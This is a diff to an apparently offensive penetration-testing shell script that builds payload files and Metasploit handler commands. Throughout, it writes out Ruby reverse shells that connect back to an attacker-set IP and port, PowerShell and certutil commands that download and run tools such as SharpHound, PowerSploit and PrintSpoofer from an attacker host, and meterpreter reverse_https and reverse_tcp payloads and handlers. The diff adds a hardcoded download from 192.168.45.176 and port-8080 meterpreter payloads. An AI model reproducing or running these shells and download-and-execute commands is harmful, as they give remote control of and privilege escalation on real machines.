@@ -89,6 +89,10 @@ echo '#RUBY' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'ruby -rsocket -e'"'f=TCPSocket.open(\"${IP}\",${PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"'' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'ruby -rsocket -e'"'exit if fork;c=TCPSocket.new(\"${IP}\",\"${PORT}\");loop{c.gets.chomp!;(exit! if \$_==\"exit\");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen(\$_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{\$_}\"}"'' >> http/payloads/${BESTAND}_${PORT}.txt
 
+
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://192.168.45.176/tools/PowerSploit.zip','C:\Windows\system32\WindowsPowerShell\v1.0\Modules\PowerSploit.zip')
+
+
 #TODO windows...
 echo "Building some basic reverse tcp shells"
 
@@ -123,6 +127,7 @@ echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\tasks\sharphound.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\tasks\meth.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
 
+echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_https \n set LHOST ${localnic}\n set LPORT 8080 \n run -j" > http/commands/msf_https8080
 echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_https \n set LHOST ${localnic}\n set LPORT ${PORT} \n run -j" > http/commands/msf_https
 echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_tcp \n set LHOST ${localnic} \n set LPORT ${PORT} \n run -j;" > http/commands/msf_tcp
 echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/PrintSpoofer64.exe print.exe && print.exe -i -c cmd" > http/commands/printspoofer
@@ -231,6 +236,12 @@ echo "[+] Generate METH reverse HTTPS payload for ${IP} on port ${PORT}"
 echo '#METERPRETER (reverse_https)' >> http/payloads/${BESTAND}_${PORT}.txt
 python3 meterpreter.py ${IP} ${PORT}
 cp meuk/meth/bin/Debug/meth.exe http/payloads/${BESTAND}_meth.exe
+
+echo '#METERPRETER (reverse_https) on port 8080' >> http/payloads/${BESTAND}_${PORT}.txt
+python3 meterpreter.py ${IP} 8080
+cp meuk/meth/bin/Debug/meth.exe http/payloads/meth8080.exe
+
+
 echo "[+] Generate METH reverse TCP payload for ${IP} on port ${PORT}"
 python3 meterpreter.py ${IP} ${PORT} windows/x64/shell_reverse_tcp
 cp meuk/meth/bin/Debug/meth.exe http/payloads/methtcp.exe
